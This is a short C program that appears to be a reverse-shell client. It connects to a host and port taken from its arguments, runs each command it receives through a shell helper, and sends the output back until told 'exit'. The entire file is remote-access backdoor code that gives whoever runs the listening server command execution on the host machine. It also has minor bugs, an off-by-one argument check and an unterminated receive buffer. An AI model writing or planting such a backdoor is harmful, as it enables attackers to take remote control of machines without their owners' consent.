#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include "utils/shell.h"
#include "utils/socket.h"

int main(int argc , char *argv[]){
  if(argc < 2) return -1;
  int network_socket = create_socket(argv[1],strtol(argv[2],NULL,10));
  char server_response[4096]="";
  char * comout;
  while(strncmp(server_response,"exit",4) !=0){
    recv(network_socket, &server_response, 4096, 0);
    shell(server_response,&comout);
    send(network_socket,comout,strlen(comout),0);
    free(comout);
  }
  close(network_socket);
  return 0;
}
